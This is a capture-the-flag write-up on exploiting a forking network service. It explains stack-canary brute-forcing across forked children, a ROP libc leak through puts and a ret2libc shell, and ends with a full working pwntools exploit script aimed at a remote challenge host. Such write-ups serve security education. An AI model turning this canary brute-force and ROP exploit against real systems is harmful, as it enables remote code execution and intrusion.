
---

# Forking Server Exploit Writeup

## Vulnerability Analysis

The challenge binary exhibits two key behaviors that define the exploitation strategy:

1. **Forking Server**: The `main` function enters an infinite loop where it `fork()`s a new child process for every connection.
* *Crucial Detail*: `fork()` creates an exact copy of the parent process, meaning the **Stack Canary** and **ASLR base** remain constant across all connections until the parent process is restarted.


2. **Stack Buffer Overflow**: The `handle_client` function declares a 1032-byte buffer (`local_418`) but populates it using `unbounded_read`. This allows us to overwrite the Stack Canary and the Return Address.

## Exploit Steps

### 1. Brute-Forcing the Canary

Since the canary is static across connections, we can guess it byte-by-byte. If we guess incorrectly, the child crashes (`__stack_chk_fail`) and the parent spawns a new one. If we guess correctly, the child executes normally.

* **Method**:
1. Send `1032` bytes of padding (filling the buffer).
2. Append the bytes we have already found (initially empty).
3. Append one guess byte (0x00 - 0xFF).
4. Check if the server replies with "Done for this round".
* **Yes**: Byte is correct. Append to known canary and move to the next byte.
* **No (EOF/Crash)**: Byte is wrong. Try next value.





### 2. Leaking Libc (ROP)

Once we have the full canary, we can bypass the stack check and overwrite the Return Address (RIP). To defeat ASLR, we construct a ROP chain to leak a GOT address.

* **Payload Construction**:
* **Padding**: 1032 bytes.
* **Canary**: The 8 bytes found in Step 1.
* **RBP**: 8 bytes of junk.
* **Gadget**: `pop rdi; ret` (loads arguments for function call).
* **Arg**: `puts@got` (we want to print the real address of `puts`).
* **Function**: `puts@plt` (call `puts`).
* **Return**: `entry_point` (0x4006a0). *We loop back to the start of the program so the process doesn't die, allowing us to send a second payload.*



### 3. Calculating Offsets & Getting Shell

The server leaks the real memory address of `puts`. We use this to calculate the base address of `libc`.

* `libc_base` = `leak` - `puts_offset`
* `system_addr` = `libc_base` + `system_offset`
* `bin_sh_addr` = `libc_base` + `bin_sh_offset`

### 4. Final Payload (Ret2Libc)

We send a final payload to trigger a shell.

* **Payload Construction**:
* **Padding**: 1032 bytes.
* **Canary**: Correct canary.
* **RBP**: Junk.
* **Stack Align**: `ret` gadget (needed for `system` calls on x64 to align stack to 16 bytes).
* **Gadget**: `pop rdi; ret`.
* **Arg**: `bin_sh_addr`.
* **Function**: `system_addr`.



```python
# Final Payload Structure
payload = flat(
    b'p' * 1032,           # Padding to Canary
    canary,                # Leaked Canary
    b'w' * 8,              # Saved RBP
    ret_gadget,            # Align Stack
    pop_rdi_ret_gadget,    # Setup Arg 1
    str_bin_sh_addr,       # "/bin/sh"
    system_address         # system()
)

```

## Exploit Script
Here is the final solution:

```python
from pwn import *
import sys

exe = ELF('./pwn')
context.binary = exe
context.log_level = 'info'
context.arch = 'amd64'
# p = process([exe.path])
p = remote('35.242.228.114',32241)
# Bad characters for scanf (Whitespace)
bad_chars = [0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20]
# bad_chars = [0xa]
def is_safe_addr(addr):
    """Checks if an address contains any bad characters."""
    addr_bytes = p64(addr)
    for b in addr_bytes:
        if b in bad_chars:
            return False
    return True

def brute_force_canary():
    p.recvuntil(b"What do you want to do?\n")
    canary = b""
    log.info("Starting Canary Brute-force...")

    for i in range(8):
        found_byte = False
        for byte in range(256):
            if i == 0 and byte != 0: continue
            if byte in bad_chars: continue # Skip whitespace

            try:
                p.recvuntil(b"I'm here to serve you. :-)\n")
            except EOFError:
                log.critical("Parent process died!")
                sys.exit(1)

            guess = bytes([byte])
            payload = b"A" * 1032 + canary + guess
            p.sendline(payload)

            try:
                response = p.recvuntil(b"Done for this round", timeout=0.05)
                if b"Done for this round" in response:
                    canary += guess
                    log.success(f"Byte found: {hex(byte)} | Canary: {canary.hex()}")
                    found_byte = True
                    break
            except:
                pass
        if not found_byte:
            log.error("Failed to find byte! Canary contains a bad char.")
            sys.exit(1)

    return canary

# 1. get Canary
canary = brute_force_canary()

# canary = p64(0x001a56e396efd18d)
log.success(f"Final Canary: {canary.hex()}")

ret_gadget = 0x00000000004005f1
pop_rdi_ret_gadget = 0x00000000004009b3
entry_address = 0x004006a0
puts_got = exe.got['puts']
puts_plt = exe.plt['puts']


payload = b'b' * 1032 # pad
payload += canary # leave canary intact
payload += b'c' * 8 # fill rbp
payload += p64(pop_rdi_ret_gadget) # pop puts got into the rdi
payload += p64(puts_got) # pointer to the real address
payload += p64(puts_plt)
payload += p64(entry_address)

p.sendlineafter("I'm here to serve you. :-)\n",payload)

# get the puts address
log.info("Payload sent. Parsing leak...")

try:
    p.recvuntil(b'b' * 1032)

    p.recv(1)

    leak_data = p.recvline().strip()

    if not leak_data:
        log.error("Leak data is empty!")
        sys.exit(1)

    puts_leak = u64(leak_data.ljust(8, b"\x00"))
    log.success(f"Leaked puts address: {hex(puts_leak)}")

except Exception as e:
    log.error(f"Failed to parse leak: {e}")
    sys.exit(1)


# pwn that shit

# now we will guess the offsets
puts_offset = 0x6f690
system_offset = 0x45390
str_bin_sh_offset = 0x18cd57
# these are for local testing
# puts_offset = 0x080e50
# system_offset = 0x050d70
# str_bin_sh_offset = 0x1d8678

libc_base_addr = puts_leak - puts_offset
system_address = libc_base_addr + system_offset
str_bin_sh_addr = libc_base_addr + str_bin_sh_offset

payload = b'p' * 1032 # reach canary
payload += canary # keep intact
payload += b'w' * 8 # fill rbp with trash
payload += p64(ret_gadget)
payload += p64(pop_rdi_ret_gadget)
payload += p64(str_bin_sh_addr)
payload += p64(system_address)

# pwned
p.sendlineafter(b"I'm here to serve you. :-)\n",payload)

p.interactive()
```
